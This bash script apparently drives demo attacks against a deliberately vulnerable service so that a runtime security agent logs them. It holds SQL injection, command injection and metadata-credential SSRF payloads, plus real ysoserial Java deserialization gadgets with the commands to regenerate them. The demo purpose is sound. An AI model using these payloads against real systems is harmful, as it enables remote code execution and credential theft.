#!/usr/bin/env bash
# scripts/attack-sim.sh — Drive request-borne input into the intentionally
# vulnerable sinks in operations-service (VulnDemoController) so a runtime
# application-security agent (e.g. Splunk Secure Application / CSA) records live
# attacks in its Application Security > Attacks view.
#
# DEMO-ONLY. Each scenario targets one of the exact dangerous operations the
# agent instruments, so it maps to the corresponding attack event type:
#   sqli   -> /api/debug/search   raw non-parameterized JDBC query   -> SQL_NONPARAM
#   rce    -> /api/debug/exec     Runtime.exec(["/bin/echo", arg])    -> EXECUTE
#   ssrf   -> /api/debug/fetch    outbound connection to metadata IP  -> SOCKET_RESOLVE
#   deser  -> /api/debug/deserialize  ObjectInputStream.readObject    -> DESEREAL
#                                  (real commons-collections 3.2.1 gadget ->
#                                   CVEs Reached: CVE-2015-7501 / CVE-2015-6420)
#   beanutils -> /api/debug/deserialize  ObjectInputStream.readObject -> DESEREAL
#                                  (real commons-beanutils 1.9.2 gadget ->
#                                   CVEs Reached: CVE-2019-10086)
# The exec sink only runs /bin/echo and the fetch sink only opens a connection, so
# nothing is actually compromised. Never point this at anything you do not own.
# Requires the vuln-demo image with VULN_DEMO_MODE=enabled (toggle-vuln-demo.sh on).
#
# Usage: ./scripts/attack-sim.sh [--scenario <name>] [--rps <n>] [--duration <s>] [--port <n>]
#
# Scenarios:
#   sqli   — SQL injection into a non-parameterized query (SQL_NONPARAM)
#   rce    — command execution via Runtime.exec (EXECUTE)
#   ssrf   — server-side request forgery to the cloud metadata IP (SOCKET_RESOLVE)
#   deser  — untrusted Java deserialization, commons-collections gadget (DESEREAL)
#   beanutils — untrusted Java deserialization, commons-beanutils gadget (DESEREAL)
#   all    — interleave every scenario (default)
set -euo pipefail

SCENARIO="all"
RPS=2
NAMESPACE="port-ops-demo"
LOCAL_PORT=39083
DURATION=120  # seconds to run (0 = run forever)

usage() {
  cat <<EOF
Usage: $(basename "$0") [OPTIONS]

Simulate benign attack traffic against operations-service for security demos.
Pair with: ./scripts/toggle-vuln-demo.sh on   (enables the vulnerable libraries)

Options:
  --scenario <name>   sqli | rce | ssrf | deser | beanutils | all  (default: ${SCENARIO})
  --rps <n>           requests per second            (default: ${RPS})
  --duration <s>      run for N seconds, 0=forever   (default: ${DURATION})
  --port <n>          local port for port-forward    (default: ${LOCAL_PORT})
  --help              Show this help message and exit

Examples:
  # Full mixed attack run for 2 minutes
  ./scripts/attack-sim.sh --scenario all --rps 3

  # SSRF-only run (outbound to the cloud metadata IP)
  ./scripts/attack-sim.sh --scenario ssrf --rps 2 --duration 60

  # SQL injection probes
  ./scripts/attack-sim.sh --scenario sqli --rps 4
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --scenario) SCENARIO="$2"; shift 2 ;;
    --rps)      RPS="$2";      shift 2 ;;
    --duration) DURATION="$2"; shift 2 ;;
    --port)     LOCAL_PORT="$2"; shift 2 ;;
    --help|-h)  usage; exit 0 ;;
    *) echo "Unknown option: $1"; usage; exit 1 ;;
  esac
done

case "$SCENARIO" in
  sqli|rce|ssrf|deser|beanutils|all) ;;
  *) echo "ERROR: Unknown scenario '${SCENARIO}'"; usage; exit 1 ;;
esac

BASE_URL="http://localhost:${LOCAL_PORT}"
SLEEP_INTERVAL=$(awk "BEGIN {printf \"%.3f\", 1/${RPS}}")

# Real ysoserial CommonsCollections7 deserialization gadget targeting the
# commons-collections 3.2.1 library planted in the vuln-demo image. When the
# /api/debug/deserialize endpoint calls ObjectInputStream.readObject() on this, the
# InvokerTransformer chain runs `touch /tmp/rce-marker` (a harmless marker, no
# data touched) INSIDE the vulnerable commons-collections code path. That makes the
# agent record a DESERIAL attack AND populate "CVEs Reached" with the
# commons-collections RCE CVEs (CVE-2015-7501 / CVE-2015-6420 / CVE-2015-4852).
# Regenerate with:  java -jar ysoserial.jar CommonsCollections7 'touch /tmp/rce-marker' | base64
# Real ysoserial CommonsBeanutils1 deserialization gadget targeting the
# commons-beanutils 1.9.2 library planted in the vuln-demo image. readObject() drives
# BeanComparator -> TemplatesImpl bytecode that runs `touch /tmp/rce-marker`
# (harmless marker) INSIDE commons-beanutils, so the agent records a DESERIAL
# attack AND populates "CVEs Reached" with CVE-2019-10086 — a second distinct CVE.
# Regenerate with (JDK 17/21 needs the module flags):
#   java --add-opens=java.base/java.util=ALL-UNNAMED \
#        --add-opens=java.base/java.lang=ALL-UNNAMED \
#        --add-opens=java.base/java.util.concurrent=ALL-UNNAMED \
#        --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
#        --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
#        --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
#        -jar ysoserial.jar CommonsBeanutils1 'touch /tmp/rce-marker' | base64
BEANUTILS_B64="rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABrDK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAadG91Y2ggL3RtcC9wc2EtZGVtby1idS1yY2UIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXI0NjQ1MzIwMjc5MTYwNDEBACBMeXNvc2VyaWFsL1B3bmVyNDY0NTMyMDI3OTE2MDQxOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AEAAAAdTK/rq+AAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4cQB+AA14"

DESER_B64="rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAACHcIAAAACwAAAAJzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AFwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABdzcQB+AA91cQB+ABQAAAACcHVxAH4AFAAAAAB0AAZpbnZva2V1cQB+ABcAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAUc3EAfgAPdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAGnRvdWNoIC90bXAvcHNhLWRlbW8tY2MtcmNldAAEZXhlY3VxAH4AFwAAAAFxAH4AHHNxAH4ACnNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAJ5eXEAfgAveHhxAH4AL3NxAH4AAnEAfgAHc3EAfgAwP0AAAAAAAAx3CAAAABAAAAABdAACelpxAH4AL3h4c3EAfgAtAAAAAng="

# ── Attack request helpers (each prints what it sent + the HTTP code) ────────────
sqli() {
  local payload="VSL-0001' OR '1'='1"
  local code
  code=$(curl -s -o /dev/null -w "%{http_code}" -G "${BASE_URL}/api/debug/search" \
    --data-urlencode "vessel_code=${payload}" || true)
  printf "[%d] SQLi   GET  /api/debug/search?vessel_code=%s -> %s\n" "$request_count" "$payload" "$code"
}

rce() {
  local payload="convert-document; id"
  local code
  code=$(curl -s -o /dev/null -w "%{http_code}" -G "${BASE_URL}/api/debug/exec" \
    --data-urlencode "cmd=${payload}" || true)
  printf "[%d] RCE    GET  /api/debug/exec?cmd=%s -> %s\n" "$request_count" "$payload" "$code"
}

ssrf() {
  local url="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  local code
  code=$(curl -s -o /dev/null -w "%{http_code}" -G "${BASE_URL}/api/debug/fetch" \
    --data-urlencode "url=${url}" || true)
  printf "[%d] SSRF   GET  /api/debug/fetch?url=169.254.169.254/... -> %s\n" "$request_count" "$code"
}

# Posts the RAW serialized gadget bytes (not base64 text) as the request body.
# This is deliberate: the runtime security agent taints the HTTP request body and
# tracks that taint into ObjectInputStream.readObject() to flag a DESEREAL attack
# and map "CVEs Reached". Base64-decoding the body inside the app would produce a
# fresh, untainted byte[] and the agent would NOT flag it (that is why the base64
# variant registered SQLi/SSRF but never a deserialization attack). We decode the
# gadget here and stream the raw bytes so the tainted body reaches readObject().
post_gadget() {
  local b64="$1"
  printf '%s' "${b64}" | openssl base64 -d -A 2>/dev/null | \
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST "${BASE_URL}/api/debug/deserialize" \
      -H "Content-Type: application/octet-stream" \
      --data-binary @- || true
}

deser() {
  local code
  code=$(post_gadget "${DESER_B64}")
  printf "[%d] DESER  POST /api/debug/deserialize (commons-collections gadget -> CVE) -> %s\n" "$request_count" "$code"
}

beanutils() {
  # Real ysoserial CommonsBeanutils1 gadget targeting commons-beanutils 1.9.2.
  # readObject() drives BeanComparator -> TemplatesImpl bytecode that runs
  # `touch /tmp/rce-marker` (harmless marker) INSIDE commons-beanutils, so the
  # agent records a DESERIAL attack and maps CVEs Reached -> CVE-2019-10086.
  local code
  code=$(post_gadget "${BEANUTILS_B64}")
  printf "[%d] DESER  POST /api/debug/deserialize (commons-beanutils gadget -> CVE) -> %s\n" "$request_count" "$code"
}

# ── Port-forward operations-service ──────────────────────────────────────────────
echo "==> WARNING: demo attack traffic — vulnerable libs must be ON (toggle-vuln-demo.sh on)"
echo "==> Starting port-forward: operations-service -> localhost:${LOCAL_PORT}"
kubectl port-forward -n "${NAMESPACE}" svc/operations-service "${LOCAL_PORT}:9083" &>/dev/null &
PF_PID=$!
trap 'echo ""; echo "Stopping... (${request_count} attacks sent)"; kill ${PF_PID} 2>/dev/null || true; wait ${PF_PID} 2>/dev/null || true' EXIT
sleep 2

request_count=0
start_time=$(date +%s)

echo "==> Attack simulator started  scenario=${SCENARIO}  rps=${RPS}"
echo "    Press Ctrl+C to stop."
echo ""

while true; do
  if [[ ${DURATION} -gt 0 ]]; then
    elapsed=$(( $(date +%s) - start_time ))
    [[ ${elapsed} -ge ${DURATION} ]] && { echo "Duration ${DURATION}s reached — stopping."; break; }
  fi

  case "$SCENARIO" in
    sqli)  sqli ;;
    rce)   rce ;;
    ssrf)  ssrf ;;
    deser) deser ;;
    beanutils) beanutils ;;
    all)
      case $(( request_count % 5 )) in
        0) sqli ;;
        1) rce ;;
        2) ssrf ;;
        3) deser ;;
        4) beanutils ;;
      esac
      ;;
  esac

  request_count=$(( request_count + 1 ))
  sleep "${SLEEP_INTERVAL}"
done
